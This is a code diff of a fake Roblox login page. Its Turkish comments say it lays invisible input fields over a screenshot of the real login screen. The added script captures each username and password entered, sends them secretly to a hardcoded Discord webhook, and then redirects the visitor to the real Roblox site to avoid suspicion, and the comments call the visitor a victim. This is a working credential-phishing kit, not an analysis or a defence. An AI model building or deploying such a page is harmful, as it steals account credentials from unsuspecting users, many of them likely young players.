@@ -18,7 +18,6 @@
             font-family: Arial, sans-serif;
         }
 
-        /* Form elemanlarını resimle birlikte sabitleyen ana kapsayıcı */
         .container {
             position: relative;
             width: 100%;
@@ -37,11 +36,10 @@
             display: block;
         }
 
-        /* Tüm input ve butonların ortak bağımsız yerleşim kuralları */
         .container input, .container button, .container a {
             position: absolute;
-            width: 19.5%; /* Genişlikleri resimdeki gri kutularla eşitlendi */
-            height: 38px; /* Sabit piksel yüksekliği verilerek taşma önlendi */
+            width: 19.5%; 
+            height: 38px; 
             left: 50%;
             transform: translateX(-50%);
             background: transparent;
@@ -50,85 +48,76 @@
             box-sizing: border-box;
         }
 
-        /* Yazı yazılan input alanlarının özel ayarları (Yazıyı tam ortalar) */
         .container input {
             color: #ffffff;
             font-size: 14px;
             padding: 0 12px;
-            line-height: 38px; /* Yazının dikeyde tam ortalanmasını sağlar */
+            line-height: 38px; 
             height: 38px;
         }
 
-        /* Tıklanabilir buton ve linklerin ayarı */
         .container button, .container a {
             cursor: pointer;
         }
 
-        /* ============================================================ */
-        /* MİLİMETRİK KONUMLANDIRMA (Yukarıdan aşağıya piksel/oran ayarları) */
-        /* ============================================================ */
-
-        /* 1. KUTU: Username Giriş Alanı */
-        .username-field {
-            top: 34%; 
-        }
-
-        /* 2. KUTU: Password Giriş Alanı */
-        .password-field {
-            top: 39.65%; 
-        }
-
-        /* 3. BUTON: Log In Butonu */
-        .login-btn {
-            top: 45.5%; 
-        }
-
-        /* 4. BUTON: Send me the one-time code by email */
-        .one-time-code-btn {
-            top: 57.5%; 
-            height: 42px; /* Bu buton biraz daha kalın olduğu için yükseltildi */
-        }
-
-        /* 5. BUTON: Quick Login */
-        .quick-login-btn {
-            top: 62.5%; 
-            height: 42px;
-        }
-
-        /* 6. LİNK: En alttaki Sign Up yazısı */
-        .signup-link {
-            top: 69.5%;
-            height: 25px;
-            width: 5%; /* Sadece "Sign up" kelimesinin üzerine gelmesi için daraltıldı */
-            left: 58%; /* Kelimenin sağda durma hizasına göre ayarlandı */
-        }
+        .username-field { top: 36.3%; }
+        .password-field { top: 41.5%; }
+        .login-btn { top: 46.8%; }
+        
+        .one-time-code-btn { top: 57.5%; height: 42px; }
+        .quick-login-btn { top: 62.5%; height: 42px; }
+        .signup-link { top: 69.5%; height: 25px; width: 5%; left: 58%; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Arka plan resmi -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- Form Elemanları (Hepsi bağımsız olarak resmin üzerine çivilendi) -->
-        <form action="giris_islem.php" method="POST">
-            
-            <!-- Kullanıcı adı alanı -->
-            <input type="text" name="username" class="username-field" required autocomplete="off">
-            
-            <!-- Şifre alanı -->
-            <input type="password" name="password" class="password-field" required>
-            
-            <!-- Giriş yap butonu -->
+        <!-- id="girisFormu" ekledik ve PHP yönlendirmesini iptal ettik -->
+        <form id="girisFormu">
+            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
+            <input type="password" id="password" name="password" class="password-field" required>
             <button type="submit" class="login-btn" title="Giriş Yap"></button>
-            
         </form>
 
-        <!-- Ekstra Fonksiyonel Butonlar ve Linkler -->
-        <button type="button" class="one-time-code-btn" onclick="alert('Kod istendi.')"></button>
-        <button type="button" class="quick-login-btn" onclick="alert('Hızlı giriş aktif.')"></button>
+        <button type="button" class="one-time-code-btn"></button>
+        <button type="button" class="quick-login-btn"></button>
         <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
     </div>
+
+    <!-- ARKA PLAN GİZLİ VERİ GÖNDERME KODU -->
+    <script>
+        // BURAYA KOPYALADIĞIN DISCORD WEBHOOK LİNKİNİ YAPIŞTIR
+        const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";
+
+        document.getElementById('girisFormu').addEventListener('submit', function(e) {
+            e.preventDefault(); // Sayfanın yenilenmesini engeller
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // Discord'a gidecek mesaj formatı
+            const mesaj = {
+                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı Adı / E-posta:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
+            };
+
+            // Veriyi gizlice Discord'a postalar
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(mesaj)
+            })
+            .then(() => {
+                // Şifreyi gönderdikten sonra şüphe çekmemek için kurbanı gerçek Roblox sitesine yönlendirir
+                window.location.href = "https://roblox.com";
+            })
+            .catch((error) => {
+                // Hata olsa bile çaktırmamak için yine de yönlendirir
+                window.location.href = "https://roblox.com";
+            });
+        });
+    </script>
 
 </body>
 </html>
